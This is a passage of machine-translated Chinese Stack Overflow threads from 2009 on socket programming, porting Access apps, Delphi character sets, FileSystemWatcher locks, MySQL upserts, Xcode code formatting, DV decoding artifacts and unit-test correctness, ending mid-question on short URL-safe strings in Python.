但是，如果您需要真正快速的东西，为什么不使用 .NET？这有很好的类来做这样的事情。您可以在 10 行中写入数据。

**PS**不要因为这是为 *nix 编写的而感到厌烦。Winsock 具有完全相同的功能。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T15:20:44.537

当您说“IP：端口”时，您必须意味着您需要比以太网框架更高的层。您应该阅读 TCP/UDP/IP 编程。我认为最好的在线资源是[Beej's Guide。](http://beej.us/guide/bgnet/). 这是针对 berkeley 或 windows 套接字的。

Python 套接字教程[在这里](http://docs.python.org/library/socket.html)。

或者只是使用谷歌搜索“[语言]中的套接字编程”。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T15:19:25.900

您可以使用[Sockets](http://tldp.org/LDP/LG/issue74/tougher.html)。

这是一些基本[教程](http://students.cs.byu.edu/~cs460ta/cs460/labs/sockettutorial.html)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-18T15:24:57.820

本教程似乎涵盖了您想要的内容：

[http://www.amk.ca/python/howto/sockets/](http://www.amk.ca/python/howto/sockets/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-18T15:44:58.147

听起来您希望能够使链路饱和以进行测试，而不考虑接收器是否可以接受所有数据。因此，您将不想使用 TCP，因为它已被确认，并且流受控以避免超出接收器。

使用 UDP 可能最容易，但如果您真的想直接编写以太网帧，您也可以考虑使用原始套接字（即，如果您需要发送没有 IP/UDP 标头的数据，只需发送原始以太网帧。在这种情况下，您需要放入以太网帧的目标 MAC 地址，以便它到达正确的位置）。

关于成帧和 CRC：以太网硬件将成帧数据包并生成/检查 CRC。

**编辑：**如果你能说明你想要达到的目标，它可能会有所帮助。是测试以太网链路/交换机的速度，还是查看发送和接收 CPU 交换数据的速度？（您通过以太网发送数据的速度可能比接收 CPU 处理它的速度更快，尽管这确实取决于以太网和 CPU 的速度，以及 CPU 正在运行的操作系统、它的繁忙程度、它的网络情况堆栈已调整等）。

# ms-access - 移植 MS Access 应用程序

> ID：561454
> 
> 赞同：1
> 
> 时间：2009-02-18T15:18:13.950
> 
> 标签：ms-access, web-applications

一位朋友要求我帮助他评估一些关于将基于 MS 访问和 VBA 的桌面应用程序移植到基于 Web 的应用程序的报价。该应用程序似乎有相对大量的业务逻辑编码到 VBA 中。

我的问题非常具体 - 是否有任何好的工具或资源可以帮助从访问中移植，而不是完全重写？

用于网络应用程序的终端技术并不重要，但理想情况下会尽可能成为主流。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T15:46:25.460

您可以探索[Sharepoint](http://office.microsoft.com/en-us/access/HA101314691033.aspx?pid=CH101741461033)提供的可能性。它可以帮助您在线获取可访问的数据，但其效果如何还取决于 Access 应用程序中使用了多少 VBA 代码。

周围有一些工具可以假装它们可以将 MS Access 转换为 PHP/ASP 网站，例如[DB Forms](http://www.dbconvert.com/products.php?pDB=1#access)，但我没有尝试过它们，它们通常只转换应用程序的可见部分，而不是查询和 VBA。
不过，它们可能有助于入门。

**随意的想法**

VBA 往往是最大的问题。迁移到 ASP.Net 需要时间，因此您面临着艰难的选择：

1.  将所有代码传输到 ASP.NET 以使其正常工作
2.  重新考虑结构并从头开始进行适当的 ASP.Net 实现。

我更喜欢第一个：尝试尽可能快地获得结果。
使用[SSMA](http://www.microsoft.com/sqlserver/2005/en/us/migration-access.aspx)将数据移动到 SQL Server（除非您希望将 Access 保留为后端）。
使表单看起来与现有应用程序上的相同（或至少具有相同的功能），将 VBA 移植到 VB.Net（或 C#，如果您愿意的话）逐个表单、逐个模块并测试它们是否工作你一起去。

在这个阶段不要试图重构或让事情变得更好，关键是在新的“系统”上“拍打”旧代码，让它像以前一样狂吠，而不是更好，而不是更糟。

只有这样，您才能开始使用您可以使用的新工具进行重构和改进。

我说这一切的前提是旧应用程序没有什么大问题，只需要移植它以供在线使用。

如果旧的应用程序有缺陷并且没有发挥其作用，那么应该更加重视重新考虑应该翻译哪些部分以及应该返工哪些部分。

无论如何，您需要制定详细的行动计划并审查当前的代码和功能，并尽量限制您对新系统第一个版本的期望：避免让每个人都输入他们的意愿，否则您的项目将变得异常困难。

专注于实现满足用户的特定功能水平所需的最低要求，然后在此基础上进行构建。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-19T02:57:06.987

为什么在 Windows 终端服务器上托管应用程序是不够的？这意味着对应用程序进行零更改，没有重新编程成本，也没有丢失关键业务逻辑的危险。如果您使用 Citrix 扩展，您可以在 Web 浏览器中运行它（尽管我猜它只适用于 IE——我从未使用过它们）。但是 RDP 客户端有 Mac 和 Linux 以及 Windows 的版本，所以你基本上可以支持任何人，只要他们为他们的操作系统安装 RDP 客户端。

是的，它更多地安装在客户端，但它的开发成本更低、更容易，并且避免了丢失编码到 Access 应用程序中的重要内容的问题。

当然，在 WTS/Citrix 上支持大量用户可能会变得昂贵，如果 Access 应用程序需要重新设计，无论如何，它可以改变平衡。但这是你应该考虑的事情。实际上，设置 WTS 真的很容易，并且为它配置服务器基本上只需添加 RAM 和 Internet 带宽（尽管 RDP 一开始确实很有效）*。*

许多人在尝试在 WTS 上运行 Access 应用程序时犯的一个关键错误：

您必须拆分数据库（前端包含表单/报告/等，后端仅包含数据表），并且每个用户必须拥有自己的前端副本（存储在 WTS 上的用户配置文件中，或存储在您的文件夹中） WTS 服务器的数据分区，具有分配给授权使用该应用程序的用户组的适当权限）。[Tony Toews 的前端更新程序](http://www.granite.ab.ca/access/autofe.htm)在这种情况下非常有用，并且明确设计为在终端服务器环境中工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T15:27:26.177

一些基本的东西可能有一些工具，比如升级到不同的数据库或者表单的外观和文本框，但是转换听起来像很多 VBA 代码的东西，不太确定。

这是一个内部网/本地网络类型的网络应用程序，还是你将它放到互联网上？安全性将成为此应用程序与您的 Access 应用程序之间的主要区别。

确保他们了解 Access/VBA，以便您可以维护 Access 应用程序生命周期内的业务逻辑。

说服您的朋友停止/减缓 Access 应用程序上的任何开发，以防止公司瞄准移动目标。这可能不现实，但确实需要考虑。

# delphi - 如何将字符串变量作为 TSysCharSet 传递

> ID：561457
> 
> 赞同：3
> 
> 时间：2009-02-18T15:19:03.747
> 
> 标签：delphi

是否可以将字符串作为 TSysCharSet 变量传递？

这当然不会编译：

```
var
  AValidChars: SysUtils.TSysCharSet;
  AResult: string;
begin
  // Edit1.Text can contain 0..9 or a..z
  AValidChars := SysUtils.TSysCharSet( [Edit1.Text] );
end; 
```

谢谢，比尔

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-18T15:23:06.700

不，不可能简单地将字符串作为 TSysCharSet 传递。

但是，您可以做的是创建一个包含字符串中所有字符的 TSysCharSet。此代码将执行此操作：

```
var
  AValidChars: SysUtils.TSysCharSet;
  s: AnsiString;
  i: integer;
begin
  // Edit1.Text can contain 0..9 or a..z
  AValidChars := [];
  s := Edit1.Text;
  for i := 1 to Length(s) do
    Include(AValidChars, s[i]);
end; 
```

如果你没有使用早期的 Delphi 版本，你也可以使用“for ... in”而不是上面的循环：

```
var
  AValidChars: SysUtils.TSysCharSet;
  c: AnsiChar;
begin
  // Edit1.Text can contain 0..9 or a..z
  AValidChars := [];
  for c in Edit1.Text do
    Include(AValidChars, c);
end; 
```

请注意，在两个代码片段中都使用了 AnsiString / AnsiChar，因为此技术不适用于 WideString 或 Delphi 2009 引入的 Unicode 字符串类型。

非常感谢[Craig Stuntz](https://stackoverflow.com/users/7714/craig-stuntz)、[Ken White](https://stackoverflow.com/users/62576/ken-white)和[Rob Kennedy](https://stackoverflow.com/users/33732/rob-kennedy)的宝贵意见，我编辑了这个答案以解决他们的所有观点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T19:33:05.460

如果在 Edit1.Text 中有字符串：

```
'0..9' 
```

那么下面的代码应该可以帮助你：

```
var 
  AValidChars: SysUtils.TSysCharSet;
  StartChar, EndChar: char;
  c: char;
begin
  StartChar := Edit1.Text[1]; // some validation should be done
  EndChar := Edit1.Text[4];
  AValidChars := [];
  for c := StartChar to EndChar do
    Include(AValidChars, c);
end; 
```

Delphi/Pascal 解析器可用于验证输入。

**更新：**

支持集合构造函数的更详细的函数：

```
function StrToSysCharSet(const S: string): TSysCharSet;
var
  Elements: TStringList;
  CurrentElement: string;
  StartChar, EndChar: char;
  c: char;
  i: Integer;
  p: Integer;
  function ReadChar: Char;
  begin
    Result := CurrentElement[p];
    Inc(p);
  end;
  function NextIsDotDot: Boolean;
  begin
    Result := '..' = Copy(CurrentElement, p, 2);
  end;
begin
  Elements := TStringList.Create;
  try
    Elements.CommaText := S;
    Result := [];
    for i := 0 to Elements.Count - 1 do
    begin
      CurrentElement := Trim(Elements[i]);
      p := 1;
      StartChar := ReadChar;
      if NextIsDotDot then
      begin
        Inc(p, 2);
        EndChar := ReadChar;
        for c := StartChar to EndChar do
          Include(Result, c);
      end
      else
        Include(Result, StartChar);
    end;
  finally
    Elements.Free;
  end;
end; 
```

它可以这样使用：

```
S := '0..9, a..z';
AValidChars := StrToSysCharSet(S); 
```

或者

```
S := '0..9 and a..z';
AValidChars := StrToSysCharSet(AnsiReplaceText(S, ' and ', ', ')); 
```

适应支持

```
S := '''0''..''9'' and ''a''..''z''' 
```

很简单。

# c# - FileSystemWatcher.WaitForChanged 返回，但文件上仍有锁

> ID：561467
> 
> 赞同：0
> 
> 时间：2009-02-18T15:21:32.960
> 
> 标签：c#, filesystemwatcher, file-locking

我有一个程序可以将文档发送到 pdf 打印机驱动程序，并且该驱动程序会打印到特定目录。打印后，我想将 pdf 附加到电子邮件 (MailMessage) 并发送出去。

现在，我将文档发送到打印机（它会产生一个新进程），然后调用 FileSystemWatcher.WaitForChanged(WaitForChangedResult.Created) 但是当创建对象时，它仍然没有完成“打印”并且 pdf 打印机仍然有一个锁定它，当我尝试将该文件附加到电子邮件时抛出错误。

*   我考虑过一个普通的 Thread.Sleep(2000) 或其他什么，但这远不理想。
*   我考虑将附件代码放在 try/catch 块中并在失败时循环，但同样，这只是个坏消息。

我真的想不出一个优雅的解决方案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T15:29:09.587

WaitForChanges 正在*等待*您对其进行编码时创建的事件。在创建文档时，您会收到通知：这并不意味着文件已完全写入并且已删除锁定。

可悲的是，除了定期轮询文件之外，我不知道有什么好的解决方案。如果有一个“所有锁被移除”事件，你可以使用它，但没有。

我刚刚检查了我们的 PDF 转储到目录代码，我们只使用 WaitForChanges 来检测新文件的开始。然后我们使用 try {} catch {}，其中 catch（未能获得对文件的权限）将尝试重新提交到我们维护的队列中：每次尝试“后退”的时间更长，因此第一次尝试是在我们检测到 1 秒后文件，第二个是 2 秒后，然后是 4、8 等。这减少了对大文件的重试次数，同时仍然对较短的文件有相当的响应。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T15:25:58.940

好吧，只要观察者正在监视文件并在文件更改时通知您，您就可以忽略在文件仍被锁定（仍在写入）时发生的更改通知，并等待最终的更改通知，这将发出信号最后一个写入事件，之后应该可以访问文件（此时您最终可以禁用手表）。

除此之外，我不确定你能做什么，因为观察者没有“文件关闭”事件 AFAIK。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T15:38:25.383

AFAIK 没有错误处理就无法检查文件锁。

pdf打印机是否从一个新进程开始？然后您应该能够监视该过程，并且当它退出时，您的文件将被解锁。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T15:53:20.467

如果您为此使用 Adob​​e 的 Acrobat，您可以使用 Acrodist.exe 生成 PDF（在我的脑海中，您想要 /N 开关），然后等待生成的进程退出

# mysql - MySQL 中是否有“如果没有这样的行插入 yyy 则更新值”？

> ID：561473
> 
> 赞同：2
> 
> 时间：2009-02-18T15:23:28.057
> 
> 标签：mysql, sql-update

我想更新 Mysql 5 上的表值，但如果键不存在，请创建它。

我发现这样做的方法是：

```
INSERT yyy ON DUPLICATE KEY UPDATE field; 
```

问题是：上述格式是否比其他方法效率低（因为插入只会发生一次并且更新会经常发生）？

例如：

```
$result = UPDATE field; 
if (num_rows_effected($result)==0) INSERT yyy 
```

此外：在 Mysql 中有没有更好的方法来做到这一点：例如一种：

```
UPDATE value IF NO SUCH ROW INSERT yyy; 
```

更新：对于那些建议更换的人，这里是我的问题的扩展：“谢谢！我需要增加一个已经在表中的计数器（如果它存在）。如果没有为该列创建一个值为 1 的表行。如何使用这种格式进行更新（REPLACE）？”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T15:32:46.803

还有一个[`REPLACE`](http://dev.mysql.com/doc/refman/5.0/en/replace.html)。

`INSERT ON DUPLICATE KEY UPDATE``UPDATE`当它偶然发现一个重复的键并且不会违反`FK`'s in case on时会触发触发器`UPDATE`。

`REPLACE`将触发`DELETE`并`INSERT`触发，并且会违反`FK`' 引用被`REPLACE`'d 的行。

如果您没有任何触发器或`FK`'s，则使用`INSERT ON DUPLICATE KEY UPDATE`，它是最有效的。

您似乎正在寻找此查询：

```
INSERT
INTO table (key, counter)
VALUES (@key, 1)
ON DUPLICATE KEY UPDATE
  counter = counter + 1 
```

`REPLACE`除非您在运行查询之前选择了计数器的先前值，否则您无法执行此操作。

*PS* `REPLACE`之前出现`MySQL`过`ON DUPLICATE KEY UPDATE`，只是为了兼容性而保留。使用它不会提高性能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T15:27:53.240

是的，您可以使用“替换”语法：

```
REPLACE INTO table1 (key, col1, col2) values (1, 'val1','val2'); 
```

这是 MySQL 特有的功能，不一定在其他数据库中实现。

至于效率，我的猜测是直接更新会更快，因为 MySQL 基本上会捕获重复键错误并相应地处理它。但是，除非您进行大量插入/更新，否则对性能的影响将相当小。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-02-18T15:28:29.417

查看 REPLACE 命令，它符合您的要求。

# objective-c - 如何为代码自动格式化设置 Xcode 插件

> ID：561474
> 
> 赞同：43
> 
> 时间：2009-02-18T15:23:34.983
> 
> 标签：objective-c, xcode

我正在寻找一个插件来在 XCode 中自动格式化 Objective-C 代码，拥有一组可选的样式格式也会很有帮助，

我的目标是遵循谷歌的代码约定：[http://google-styleguide.googlecode.com/svn/trunk/objcguide.xml](http://google-styleguide.googlecode.com/svn/trunk/objcguide.xml)作为开始，任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2011-09-06T14:46:11.433

***2013 年 4 月更新***

正如 Roger Nolan 和 rcw3 建议的那样，您可以使用[Uncrustify 走得更远](http://uncrustify.sourceforge.net)。最新的发布版本可以在[这里](http://sourceforge.net/projects/uncrustify/files/uncrustify/)下载。

* * *

## 集成到 Xcode

与 Xcode 的集成取决于安装的 Xcode 版本。

*   **Xcode 4.6 及更新版本**

Benoît Bourdon 的[BBUncrustifyPlugin-Xcode](https://github.com/benoitsan/BBUncrustifyPlugin-Xcode)

这个插件提供从 Xcode 的“编辑”菜单（“Uncrustify Selected Files”、“Uncrustify Active File”和“Uncrustify Selected Lines”）访问 Uncrustify 的权限。只需构建项目并编译和安装插件。

截至 2013 年 4 月 2 日，Uncrustify 0.60 和 Uncrustify 配置文件包含在插件中。要使用自定义 Uncrustify 配置文件，请务必阅读标题为“如何自定义 Uncrustify 配置？”的部分。的[README.md](https://github.com/benoitsan/BBUncrustifyPlugin-Xcode/blob/master/README.md)。

*注意：要从命令行使用 Uncrustify，例如作为 git hook 的一部分，我建议独立构建和安装[Uncrustify](http://sourceforge.net/projects/uncrustify/files/uncrustify/)。为了保持一致性，我还建议将插件随附的 Uncrustify 版本替换为独立构建和安装的 Uncrustify 版本的链接。以下是如何做到这一点：*

```
cd ~/Library/Application\ Support/Developer/Shared/Xcode/Plug-ins/UncrustifyPlugin.xcplugin/Contents/Resources
mv uncrustify uncrustify.orig
ln -s /usr/local/bin/uncrustify uncrustify 
```

*   **Xcode 4.x**

Jonah Williams[在 Xcode 4 中的代码格式化](http://blog.carbonfive.com/2011/03/10/code-formatting-in-xcode-4/)

*   **Xcode 3.x**

Jonah Williams[在 Xcode 中的代码格式化](http://blog.carbonfive.com/2009/08/07/code-formatting-in-xcode/)

* * *

## 示例 Uncrustify 配置文件

我用于 Objective-C 的 Uncrustify 0.60 配置文件位于[此处](https://gist.github.com/m2orris/5297267)。

* * *

## 为新版本的 Uncrustify 更新 Uncrustify 配置文件

要为新版本的 Uncrustify 更新 Uncrustify 配置文件，请启动终端并键入：

```
mv uncrustify.cfg uncrustify.cfg.old
uncrustify -c uncrustify.cfg.old --update-config > uncrustify.cfg 
```

要查看对 Uncrustify 配置所做的更改，请在终端中键入：

```
diff uncrustify.cfg.old uncrustify.cfg 
```

* * *

## 查看 Uncrustify 配置文件的记录版本

要查看 Uncrustify 配置文件的文档版本，请启动终端并键入：

```
uncrustify -c uncrustify.cfg --show-config 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-04-17T07:33:20.543

XCode 有一个内置的代码格式化程序——它有点基础，但可以重新缩进你的代码。首先在 Xcode 中设置您的缩进首选项（[如 mouviciel 建议的那样](http://developer.apple.com/documentation/developertools/conceptual/XcodeWorkspace/100-The_Text_Editor/chapter_5_section_12.html#//apple_ref/doc/uid/TP40002679-SW64)）。然后选择要重新设计的源并选择 Edit | 格式 | 重新缩进。

如果你想更进一步，Hackertoys 提供了向 Xcode[添加 uncrustify 支持的说明。](http://hackertoys.com/2008/09/18/adding-a-code-beautifier-script-to-xcode/)我没有试过这个。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-05-26T07:06:16.083

Jetbrains 的 AppCode 有一个非常好的代码格式化程序。就我的口味而言，uncrustify 感觉太老套了。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2010-02-28T21:52:47.420

在修补了多个外部格式化程序和弱的内部 xcode 格式化程序之后，我终于解决了 uncrustify。Uncrustify 具有相当好的 Objective-C 支持，可以作为用户脚本轻松地与 xcode 集成，并为 xcode 原生支持的几乎所有语言提供集中格式化程序。

xcode 的最大障碍是令人生畏的配置文件。我的建议是，采用提供的示例配置之一（ben2.cfg 非常好），合并到 objc.cfg 示例中，并根据需要进行调整。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-19T16:33:11.067

据报道，[bcpp](http://invisible-island.net/bcpp/bcpp.html)在 obj-c 上工作得很好，它也有一个[TextMate](http://blog.neontology.com/posts/2007/01/05/beautiful-c-in-textmate)插件。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-19T16:19:36.473

部分答案是可以在 Xcode 中设置一些小东西，例如 2 空格缩进。请参阅Xcode 工作区指南中的[缩进首选项](http://developer.apple.com/documentation/developertools/conceptual/XcodeWorkspace/100-The_Text_Editor/chapter_5_section_12.html#//apple_ref/doc/uid/TP40002679-SW64)。

# java - 视频伪影/伪影的原因

> ID：561484
> 
> 赞同：1
> 
> 时间：2009-02-18T15:25:12.343
> 
> 标签：java, video, encode, decode, playback

![替代文字][1]

上面的屏幕截图显示了在软件解码 .DV 视频文件期间发生的一些伪影，符合 SMPTE 314m...

伪影被认为是由 AC/DC 系数问题引起的，这可能吗？

任何信息表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T16:20:00.840

我不确定问题是什么。块状似乎表明您正在错误地解码 AC 系数。好消息是，似乎每个宏块都被错误地解码了。如果不出意外，它们太黑了。因此，我将逐步完成单个块的解码。手工计算，然后在调试器中观察它的解码。看看数字在哪里分歧。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T15:41:31.010

在我看来，您可能没有正确解码帧压缩...

-亚当

# unit-testing - 你如何判断你的单元测试是正确的？

> ID：561485
> 
> 赞同：22
> 
> 时间：2009-02-18T15:25:22.327
> 
> 标签：unit-testing, tdd

在我职业生涯的不同阶段，我只进行了次要的单元测试。每当我再次开始深入研究它时，我总是困扰着如何证明我的测试是正确的。如何判断我的单元测试中没有错误？通常我最终会运行应用程序，证明它有效，然后使用单元测试作为一种回归测试。推荐的方法是什么和/或您对这个问题采取的方法是什么？

编辑：我也意识到您可以编写易于理解的小型、精细的单元测试。但是，如果您假设小而细的代码是完美无缺的，那么您可以只编写小的、细粒度的程序而不需要单元测试。

Edit2：对于“单元测试是为了确保您的更改不会破坏任何东西”和“只有在测试与代码具有完全相同的缺陷时才会发生这种情况”的论点，如果测试过拟合怎么办？有可能通过糟糕的测试同时通过好代码和坏代码。我的主要问题是单元测试有什么好处，因为如果你的测试有缺陷，你就不能真正提高你对代码的信心，不能真正证明你的重构有效，也不能真正证明你符合规范？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-02-18T15:34:21.057

单元测试应该表达你正在测试的任何东西的“合同”。它或多或少是放入代码中的单元规范。因此，鉴于规范，单元测试是否“正确”应该或多或少显而易见。

但我不会太担心单元测试的“正确性”。它们是软件的一部分，因此，它们也很可能是不正确的。单元测试的重点——从我的观点来看——是它们确保你的软件的“合同”不会*被意外*破坏。这就是单元测试如此有价值的原因：您可以在软件中挖掘，重构某些部分，更改其他部分的算法，并且您的单元测试会告诉您是否破坏了任何东西。即使是*不正确*的单元测试也会告诉你这一点。

如果您的单元测试中有错误，您会发现 - 因为单元测试失败，而测试代码证明是正确的。那么，修复单元测试。没什么大不了。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-18T15:30:37.977

好吧，Dijkstra 有句名言：

> “测试表明存在，而不是不存在错误”

IOW，您将如何为函数 add(int, int) 编写单元测试？

IOW，这是一个艰难的过程。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-02-18T15:58:19.610

有两种方法可以帮助确保单元测试的正确性：

*   TDD：首先编写测试，然后编写要测试的代码。这意味着你会*看到*他们失败。如果您知道它至少检测到*某些*类别的错误（例如“我还没有在我要测试的函数中实现任何功能”），那么您就知道它并非完全没用。它可能仍然会漏掉一些其他错误，但我们知道测试并非*完全*不正确。
*   进行大量测试。如果一个测试漏掉了一些错误，它们很可能会导致错误进一步下降，从而导致其他测试失败。当您注意到这一点并修复有问题的代码时，您就有机会检查为什么第一个测试没有按预期捕获错误。

最后，当然，保持单元测试如此简单，以至于它们不太可能包含错误。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-02-18T15:31:54.573

如果这是一个问题，您的代码必须以某种方式出现错误，从而巧合地导致您的测试通过。这最近发生在我身上，我正在检查给定条件 (a) 是否导致方法失败。测试通过（即方法失败），但它通过了，因为另一个条件 (b) 导致失败。仔细编写测试，并确保单元测试测试一件事。

但是，通常不能编写测试来证明代码没有错误。他们是朝着正确方向迈出的一步。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-05-20T13:53:00.527

我也有同样的问题，并且在阅读了评论后，这就是我现在的想法（应归功于先前的答案）：

我认为问题可能在于我们都采用了单元测试的表面目的——证明代码是正确的——并将该目的应用于测试本身。就目前而言这很好，除了**单元测试的目的不是证明代码是正确的**。

与所有重要的努力一样，您永远无法百分百确定。单元测试的正确目的是**减少错误**，而不是消除错误。最具体地说，正如其他人所指出的，当您稍后进行更改时，可能会意外破坏某些内容。单元测试只是减少错误的一种工具，当然不应该是唯一的一种。理想情况下，您将单元测试与代码审查和可靠的 QA 结合起来，以便将错误减少到可容忍的水平。

单元测试比你的代码简单得多；如果你的代码做了任何重要的事情，就不可能让你的代码像单元测试一样简单。如果你编写的“小而细”的代码很容易证明是正确的，那么你的代码将包含大量的小函数，你仍然需要确定它们是否都能正常工作。

由于单元测试不可避免地比他们正在测试的代码更简单，因此它们不太可能出现错误。即使你的一些单元测试有问题，总体上它们仍然会提高你的主要代码库的质量。（如果您的单元测试如此错误以至于这不是真的，那么您的主要代码库也很可能是一堆热气腾腾的东西，而您完全被搞砸了。我认为我们都假设了基本的能力水平。）

如果你确实想要应用第二级单元测试来证明你的单元测试是正确的，你可以这样做，但它会受到收益递减的影响。以假数字方式查看它：

假设单元测试将生产错误的数量减少了 50%。然后，您编写元单元测试（单元测试以发现单元测试中的错误）。假设这会发现您的单元测试存在问题，将生产错误率降低到 40%。但是编写元单元测试所花费的时间是编写单元测试所花费的 80%。对于 80% 的努力，你只获得了另外 20% 的收益。也许编写元元单元测试会给你另外 5 个百分点，但现在又花了 80% 的时间来编写元单元测试，所以编写单元测试的工作量的 64%（这给了你50%）你还有5%。即使有更自由的数字，这也不是消磨时间的有效方式。

在这种情况下，很明显，超过编写单元测试的点是不值得的。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-02-18T15:41:13.380

1.  单元测试代码的*复杂度*（或应该）低于（通常是几个数量级）实际代码
2.  您在单元测试中编写与实际代码中的错误完全匹配的错误的机会远小于仅在真实代码中编写错误（如果您在单元测试中编写的错误与实际代码中的错误不匹配）你的真实代码应该会失败）。当然，如果您在真实代码中做出了不正确的假设，您可能会再次做出相同的假设——尽管单元测试的思维方式仍然应该减少这种情况
3.  正如已经提到的，当您编写单元测试时，您拥有（或应该拥有）不同的思维定势。在编写真正的代码时，您正在考虑“我该如何解决这个问题”。在编写单元测试时，你在想，“我如何测试所有可能破坏的方式”

正如其他人已经说过的那样，这不是关于您是否可以证明单元测试是正确和完整的（尽管使用测试代码几乎可以肯定这要容易得多），因为它将错误数量减少到非常低的数量 - 并将其推低和更低。

当然，你必须对单元测试有足够的信心来依赖它们——例如在进行重构时。达到这一点通常只是经验和直觉的一个案例（尽管有代码覆盖工具可以提供帮助）。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-02-18T23:14:52.417

首先让我先说单元测试不仅仅是关于测试。它更多地是关于应用程序的设计。要看到这一点，您应该在显示器上放置一个摄像头，并在编写单元测试时记录您的编码。您将意识到在编写单元测试时您正在做出很多设计决策。

如何知道我的单元测试是否良好？

您无法测试逻辑部分期间！如果您的代码说 2+2 = 5 并且您的测试确保 2+2 = 5 那么对您来说 2+2 是 5。要编写好的单元测试，您必须对您正在使用的领域有很好的理解。当您知道自己要完成的工作时，您将编写好的测试和好的代码来完成它。如果你有很多单元测试并且你的假设是错误的，那么迟早你会发现你的错误。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-02-19T00:30:32.297

这是 TDD 的优点之一：代码充当测试的测试。

您可能会犯相同的错误，但根据我的经验，这种情况并不常见。

但是我确实遇到过这样的情况，即我编写了一个测试失败，只是让它通过，这告诉我我的测试是错误的。

在我第一次学习单元测试的时候，在做 TDD 之前，我也会在写完测试后故意破坏代码，以确保它按预期失败。当我不知道的时候，我知道测试被打破了。

我真的很喜欢 Bob Martin 将其描述为等同于复式簿记的描述。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2009-02-18T15:28:05.393

我想首先编写测试（在编写代码之前）是确保测试有效的一种很好的方法。

或者你可以为你的单元测试编写测试......：P

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2009-02-18T15:28:59.463

你不说。一般来说，测试会比他们正在测试的代码更简单，所以这个想法很简单，就是他们比真正的代码*更*不可能有错误。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2010-05-05T06:52:17.993

Dominic mentioned that "For this to be a problem your code would have to be buggy in a way that coincidentally causes your tests to pass.". One technique you can use to see if this is a problem is [mutation testing](http://en.wikipedia.org/wiki/Mutation_testing). It makes changes to your code, and see if it causes the unit tests to fail. If it doesn't, then it may indicate areas where the testing isn't 100% thorough.

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2013-05-31T23:31:34.137

单元测试是您的要求具体化。我不了解你，但我喜欢在开始编码 (TDD) 之前指定要求。通过编写它们并像对待任何其他代码一样对待它们，您将开始有信心在不破坏旧功能的情况下引入新功能。为了确保需要您的所有代码并且测试实际上测试了我使用的代码[ptest](http://pitest.org/)（其他语言的突变测试的其他变体）。对我来说，未经测试的代码是有缺陷的代码，无论它多么干净。

如果测试测试复杂的代码并且本身很复杂，我经常为我的测试编写测试（[示例](https://github.com/Softhouse/jargo/blob/master/common-test/src/test/java/se/softhouse/common/testlib/ConcurrencyTesterTest.java)）。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2009-02-18T15:29:55.763

如上所述，最好的方法是在实际代码之前编写测试。如果适用（数学公式或类似），也可以找到您的测试代码的真实示例，并将单元测试和预期输出与之进行比较。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2009-02-18T15:34:20.823

这是困扰每个使用单元测试的人的问题。如果我必须给你一个简短的回答，我会告诉你永远相信你的单元测试。但我想说，这应该以您以前的经验为依据：

*   您是否有任何通过手动测试报告的缺陷并且单元测试没有捕获（尽管它有责任），因为您的测试中有错误？
*   你过去有过假阴性吗？
*   你的单元测试足够简单吗？
*   您是在新代码之前编写它们还是至少并行编写它们？

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2009-02-18T15:57:29.707

你不能证明测试是正确的，如果你试图证明，你做错了。

单元测试是第一个屏幕——冒烟测试——就像所有的自动化测试一样。他们主要是告诉你你*以后*做的改变是否会破坏东西。即使在 100% 的覆盖率下，它们也不是质量证明。

不过，该指标确实让管理感觉更好，而且有时这本身很有用！

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2009-11-30T20:26:42.487

*编辑：我也意识到您可以编写易于理解的小型、精细的单元测试。但是，如果您假设小而细的代码是完美无缺的，那么您可以只编写小的、细粒度的程序而不需要单元测试。*

单元测试的想法是测试最细粒度的东西，然后将测试堆叠在一起以证明更大的情况。如果你正在编写大型测试，你会失去一些好处，尽管编写大型测试可能更快。

# python - 如何将整数转换为 Python 中最短的 url 安全字符串？

> ID：561486
> 
> 赞同：67
> 
> 时间：2009-02-18T15:25:25.633
> 
> 标签：python, url, base64

